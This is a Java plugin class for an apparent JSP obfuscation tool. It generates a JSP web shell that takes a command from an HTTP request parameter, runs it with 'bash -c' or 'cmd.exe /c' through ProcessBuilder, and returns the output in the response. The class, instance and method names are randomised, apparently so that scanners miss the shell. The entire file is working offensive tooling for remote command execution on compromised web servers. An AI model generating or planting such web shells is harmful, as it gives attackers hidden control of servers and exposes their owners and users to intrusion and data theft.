package com.t3stzer0.jspobfuscator.plugins.extensions.Gadget;

import com.t3stzer0.jspobfuscator.api.plugin.context.ExtensionContext;
import com.t3stzer0.jspobfuscator.api.plugin.exceptions.ExtensionException;
import com.t3stzer0.jspobfuscator.api.plugin.gadget.GadgetExtension;
import com.t3stzer0.jspobfuscator.plugins.common.utils.random.RandomGenerator;
import org.apache.commons.text.StringSubstitutor;
import org.pf4j.Extension;

import java.util.HashMap;
import java.util.List;
import java.util.Map;

@Extension
public class ProcessBuilderStart implements GadgetExtension {
  private final String COMMAND_PARAMETER = "CommandParameter";
  private final String SYSTEM = "System";
  private final String[] SYSTEM_OPTIONS = {"Linux", "Windows"};

  @Override
  public void initExtension(ExtensionContext ctx) {
    ctx.registerStringInput(COMMAND_PARAMETER, true, "cmd");
    ctx.registerSelectInput(SYSTEM, List.of(SYSTEM_OPTIONS), true, 0);
  }

  @Override
  public List<String> getCode(ExtensionContext ctx) {
    RandomGenerator rng = new RandomGenerator(ctx.getRandomSeed());
    int system = ctx.getSelectInput(SYSTEM);
    String command =
        switch (SYSTEM_OPTIONS[system]) {
          case "Linux" -> "\"bash\", \"-c\"";
          case "Windows" -> "\"cmd.exe\", \"/c\"";
          default -> throw new ExtensionException("Unexpected system option: " + system);
        };
    String cmdParam = ctx.getStringInput(COMMAND_PARAMETER);
    String innerClassName = "" + rng.nextChar() + rng.nextChar();
    String className = "" + rng.nextChar() + rng.nextChar() + rng.nextChar();
    String instanceName = "" + rng.nextChar() + rng.nextChar() + rng.nextDigitChar();
    String methodName = "" + rng.nextChar() + rng.nextDigitChar() + rng.nextChar();
    Map<String, String> valuesMap = new HashMap<>();
    valuesMap.put("innerClassName", innerClassName);
    valuesMap.put("instanceName", instanceName);
    valuesMap.put("cmdParam", cmdParam);
    valuesMap.put("className", className);
    valuesMap.put("methodName", methodName);
    valuesMap.put("command", command);
    StringSubstitutor sub = new StringSubstitutor(valuesMap);
    String templateString =
"""
try {
    final String cmd = request.getParameter("${cmdParam}");
    class ${className} {
        ${innerClassName} ${instanceName};
        class ${innerClassName} {
            private Process process;
            public ${innerClassName}() throws IOException {
                process = new ProcessBuilder().command(${command}, cmd).start();
            }
        }
        public ${className}() throws IOException {
            ${instanceName} = new ${innerClassName}();
        }
        public String ${methodName}() throws IOException {
            Process process = ${instanceName}.process;
            InputStream inputStream = process.getInputStream();
            StringBuilder stringBuilder = new StringBuilder();
            BufferedReader bufferedReader = new BufferedReader(new InputStreamReader(inputStream));
            String line;
            while ((line = bufferedReader.readLine()) != null) {
                stringBuilder.append(line).append("\\n");
            }
            return stringBuilder.toString();
        }
    }
    response.getOutputStream().write(new ${className}().${methodName}().getBytes());
} catch (Exception e) {
    e.printStackTrace();
}
""";

    String resolvedString = sub.replace(templateString);
    return List.of(String.format(resolvedString));
  }

  @Override
  public List<String> getDeclaration(ExtensionContext ctx) {
    return List.of();
  }

  @Override
  public List<String> getImports(ExtensionContext ctx) {
    return List.of("java.io.*");
  }
}
